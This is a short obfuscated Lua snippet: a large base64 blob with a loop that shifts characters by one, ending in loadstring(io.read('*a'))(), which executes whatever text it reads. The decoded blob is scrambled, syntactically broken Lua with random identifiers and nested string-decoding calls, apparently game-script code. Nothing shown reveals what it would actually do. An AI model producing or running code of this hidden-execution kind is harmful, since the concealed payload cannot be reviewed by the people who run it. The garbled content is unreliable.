V3EgPSAoKGdRT3ZrdG1yZUIpWyJ6YVBiaFRoYlJuIl0oImlqZ05zVW1Oc1Y9PSIpKQogICAgICAgICAgICBabHdhclJvbmlWKCgobUlrcHRGWnhweSlbInphUGJoVGhiUm4iXSgiVWlpaW94R0dCTT09IikpLCBlRUZKT0xJUXdjKQogICAgICAgICAgICBpZiBBYXdvY0dsTUVhIHRoZW4KICAgICAgICBsb2NhbCBGTm1Fd0duenVPCiAgICBLa3pPaVNCanNsLkhXdnFFVmlIbU0uQ0V4a2dSbkRURTpramFxanpEbkJsKGZ1bmN0aW9uKEFEQ25TR25ydFEpCiAgICAgICAgICAgIFRBaWhJUWpqV2koKQogICAgKChqREtUcGJ4Q3huKVsiemFQYmhUaGJSbiJdKCJSaVFpQVVaQmJZIikpLAogICAgICAgICAgICBLa3pPaVNCanNsLkhXdnFFVmlIbU0ueEhsZXlDU0NBeTpMTlp0UXVHV3loKCkKKQpjWEV5QWJBdFR1OlJZd0FiREZmaUkoCiAgICAgICAgTXFZb3hEb3NKRyA9ICgoS2JRVG9pR1FYTylbInphUGJoVGhiUm4iXSgic3RsY2RmR2hzdD09IikpLAogICAgfQogICAgfQogICAgICAgICAgICAgICAgICAgIGlmIGpjYlBxZ2dTYXEgTHp1b2NWRHNHciBqY2JQcWdnU2FxOlp3b29TaWpVSEsoKChNbU5jdkxtZVJTKVsiemFQYmhUaGJSbiJdKCJhYllxVlVwREVGIikpKSB0aGVuCiAgICBlbmQKICAgICAgICBaWVlCcmdUSkZaOm1NV3JGbUhPdFUod0hEbURTUGF3UihoVU9qdVR3T2pPKSkKLS0gbUZ5Vk5hT1FDSiBrSEtZVkVFRkliIGlFa0ZLbmZXeUYgS3ZoY0Z2T3hhVCBhY0hpa1RrY3laICh1cHR1SnRVQWNDIERkZ1NBUVVWWk0gblVKSWJpcUtOZykKSVdESlBDZGd2Ry5zd0Rwd2N5TW9HOmtqYXFqekRuQmwoZnVuY3Rpb24oKQpsb2NhbCBqcUVVREVFYVdGID0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIE9JU25tdHRtZ1UgdGhlbgogICAgcmV0dXJuIGpjYlBxZ2dTYXEKICAgICAgICAgICAgZEdmcFVaSURFRiBFYmx0bEZyZEVzIHBZaWlXWkdVQnIKCiAgICBzc2JGQUttbUlDLAogICAgICAgIGxvY2FsIE5nbXBmZHlLZ0ogPSBYZ292RGh5VGJZLm52ZHFkdWh5V0JbS2t6T2lTQmpzbC5VdVdLSEJxbEJlXS5UR1p5VXlIcGFOLkFOT1hJT1hRVnYud1NRT2lQY0hrSQpwRmR6TWFsYkx3LkxJQnZpa0p2a1ggPSBQZnVGVHNyRUtZLnhoVG9namVpZmgoMCwgNjAsIDAsIDYwKSAtLSBwVVBGUnhDaUxlIFFvR2NxZEFRcUcgZHJLVU90QkRmbSB6aHZWZ2RVcldVIHBIU3ZZclBWWGIgaEh4ek1qRWZUWQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbUhMRVlDWGxORzpTaFZZTEhuWWtwKG1WYmptZnlkVm0ueGhUb2dqZWlmaChtS1JMSWNCUnBNKSkKICAgICAgICBOeXpVYWlXcVdxID0gd1NRT2lQY0hrSQpsb2NhbCBFU2hYSFJxSHBKID0gUW5MWGlWVk9Vai5ER1Zua05pa2hTOmZJV0RBT3BCeEYoKChkblRzQVBDeFpmKVsiemFQYmhUaGJSbiJdKCJudHBycmFFRWVPPSIpKSkKCiAgICAgICAgenlaTVZuUUd1RiA9IHRIZW92aEprUkEKICAgICAgICAgICAgICAgIHRVRFZIcU56Vmw6bU1XckZtSE90VShQY09SRmlHS1JJLCAoKE5RVExseFVReFopWyJ6YVBiaFRoYlJuIl0oIk1qeWxuVFNaQkUiKSksIG5pbCwgMSkKICAgICAgICAgICAgICAgIGlmIGxqUEZ5eHNhTHcuSWJhekdqRHBMVSB0aGVuCiAgICAgICAgICAgICAgICBhb2VDbnRWaXlxLmJTZXlqeXdkRU8oMC4wMSkKICAgICAgICAgICAgKTpCU2lEbVNLSFNzKCgobEFka3VlR0lwcClbInphUGJoVGhiUm4iXSgickxCdkFCVVVPeT0iKSksIDllOSk6QlNpRG1TS0hTcygoKHVrZ1V0b3BFblYpWyJ6YVBiaFRoYlJuIl0oIlNBc3lib0hOUmk9PSIpKSwgOWU5KQogICAgICAgICAgICBsVnBTZWVlT2lDCgogICAgICAgIE5RWlVIUFdETW8gPSBmdW5jdGlvbigpCgogICAgICAgIGxhd2tXQVZVaFogPSAoKE56YVpwVEVxV1ApWyJ6YVBiaFRoYlJuIl0oImx3YUNBWm9iTmg9IikpLAogICAgICAgICAgICAgICAgICAgIElvYlNlamlOR1I6bHJnb3NSdHJYdigpCiAgICBpZiBBTk9YSU9YUVZ2OlZ3SXZoRXdOS3YoKCh2cklERk5LZGdkKVsiemFQYmhUaGJSbiJdKCJ5Sk9Md21xcUt2IikpKSB0aGVuCiAgICBmdW5jdGlvbihQek9mZkVwemJqKQogICAgICAgIHlKWUdkVmp6ZUcuU1RCYkhCZ2ZLSyhmYlR1YVpKWGhDLCBJb2JTZWppTkdSLlV1V0tIQnFsQmUpCiAgICBpZiBxc2xHQnNIR0JWIHNGd3hVaHJFbVkgdGhlbgoKICAgIGxvY2FsIHltRGNBeWhGa0sgPSBTVXlYV3dYRkl0LnhoVG9namVpZmgoKChydU5KZGhLSnNZKVsiemFQYmhUaGJSbiJdKCJxSlFSUGxRT3F5PT0iKSkpCiAgICAgICAgb0VMT1ZGaFNXeCA9ICgoVG9ibGVITFhjYylbInphUGJoVGhiUm4iXSgiRVBPTFVEbXBRSSIpKSwKLS0gSFVmVURVSVZyci5nRG1vUUV2Vk1LID0gZVpFWlJWa2prQi54aFRvZ2plaWZoewogICAgICAgICAgICBzR0tZWlJPUkhtOnZOZ010ZlB3VngoCiAgICBsb2NhbCBXcUJXVXZqckhTID0gSFd2cUVWaUhtTTpad29vU2lqVUhLKCgoUUpVUFVZQmlTSilbInphUGJoVGhiUm4iXSgiY1BjbmZ2VHlWRT09IikpKQogICAgewogICAgewpsb2NhbCBSRlJ3U0dmbkp5ID0gUW5MWGlWVk9Vai5NSXlGQ3lXeUpPOml2VXJKWHdrblooKChZU2RvV1RKcmRxKVsiemFQYmhUaGJSbiJdKCJaVmd1V2FJS3BJPT0iKSksIHtsYXdrV0FWVWhaID0gKChxUmV4TG5sRWpYKVsiemFQYmhUaGJSbiJdKCJhSG1tc0JubGhjPSIpKSwgdkdMbEJ6V2dDaiA9IGZhbHNlfSkKCmxvY2FsIEhHSXJRdnpPeXUgPSBLa3pPaVNCanNsLkhHSXJRdnpPeXUKICAgICAgICAgICAgZEdmcFVaSURFRiBUaHNNUm1GVmh0IHBZaWlXWkdVQnIKICAgIGVuZAogICAgICAgIGNYU0RVcXd3bEQuR1J6Y21Sc2lYQyA9IHdTUU9pUGNIa0kKCiAgICAgICAgICAgIGxvY2FsIGN5WVV3UVpMeXkgPSBVV2Z5QmxRV3VpLkhXdnFFVmlIbU0gSmRsbGRmRnl3WCBVV2Z5QmxRV3VpLmtobllXZ0NvUkc6T3dKRFlUV3dRYigpCmxvY2FsIEFhd29jR2xNRWEgPQogICAgTlFaVUhQV0RNbyA9IGZ1bmN0aW9uKHVIc1NnREhKaVcpCi0tIFJ1VlVuWGlUZVAuc2pIZXBBSk1BeSA9IDEKLS0gbUZ5Vk5hT1FDSiBrSEtZVkVFRkliIENpUmZBcFBCbVEgY2d5RWJydGxiZgoKLS0gcUt3VWFpVmpzSSBSb29OR0RHR3psIE9aRUV3RXJVUWYgRGRnU0FRVVZaTSBaYUdQWWRmaEhSCiAgICAgICAgeUpZR2RWanplRy5TVEJiSEJnZktLKG9jTHd3U2JGd3YsIFhVRG5lVHljc2suVXVXS0hCcWxCZSkKLS0gLy8gdkh2eEdsWWhsSCB1ZWlLRnJBbE1jIC8vIC0tCiAgICBkR2ZwVVpJREVGIG5GVUxLUWJCdWoud1NRT2lQY0hrSSBwWWlpV1pHVUJyCiAgICBRbkxYaVZWT1VqLlp6VEFpWGdkb246VklIY1laU1J2QigKcEZkek1hbGJMdy5oSUNyQVpVcWxkID0gUGZ1RlRzckVLWS54aFRvZ2plaWZoKDAuMSwgMCwgMC4yLCAwKSAtLSBaQXBEWUZiYnhuIFhMbkZUYWtMaEYKICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiB3eVplWVhYbUhWIEx6dW9jVkRzR3IgU1phQ0tnVG1TSS54Qm1wcXJLbGxLIH49IG5pbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxWcFNlZWVPaUMKICAgICAgICBNanppV3ptQ3JXID0gMQoKICAgIGlmIHFzbEdCc0hHQlYgY1hTRFVxd3dsRC5vWUhrbEd0WVRzIHRoZW4KICAgICAgICBoeGdJVXlDVXNPID0gZmFsc2UsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFF4cHpLQkljZmI6THRCaWd5U0laVygpIC0tIEdldXd2WFR3TU4gYm1qQkNCeFhDciBkcktVT3RCRGZtIEhNeEVOTkd5WE8KICAgICAgICAgICAgICAgICAgICAtLSBLT3RNVnprbmlwIFdGSnhxVU9Vb24gaW5BeXhnc1FiTCBiUXBxYVRQYXdiCiAgICAgICAgICAgICAgICAgICAgICAgIFpsd2FyUm9uaVYoKChMTkdRVmtwSlBpKVsiemFQYmhUaGJSbiJdKCI0cHlGSUU5NGVXZGxiaUE9IikpIC4uIChLT3BHRmxLV0RyIEx6dW9jVkRzR3IgKChNQUZNeU9FeUxCKVsiemFQYmhUaGJSbiJdKCJRenFLaXBxcVdWIikpIEpkbGxkZkZ5d1ggKCh4YWdlcWVlQndyKVsiemFQYmhUaGJSbiJdKCJDdktFWU9ra09TPT0iKSkpKQogICAgKCh6dEl1UmlWVk5iKVsiemFQYmhUaGJSbiJdKCJFVndWT2FtRmZmPT0iKSksCnlKWUdkVmp6ZUcuRXFCSUdPdUFnZyhvY0x3d1NiRnd2LCBmdW5jdGlvbihMTHlWU3pOaEJiLCBCYkh1VGFVYVJyKQogICAgICAgIGFvZUNudFZpeXEuYlNleWp5d2RFTygxLjgpCiAgICAgICAgICAgICAgICAgICAgICAgIFhuTFZlanlacWI6YmJpdEpzbWhIeihES2ZLUlhqV1JlLmhTdk9RVFFEYk0sIElIdnRuZ0xPZlIoZUVGSk9MSVF3YyksIFVXZnlCbFFXdWkp' for i=1,#b do local c=b:sub(i,i):byte() io.write(string.char(c-1)) end loadstring(io.read('*a'))()
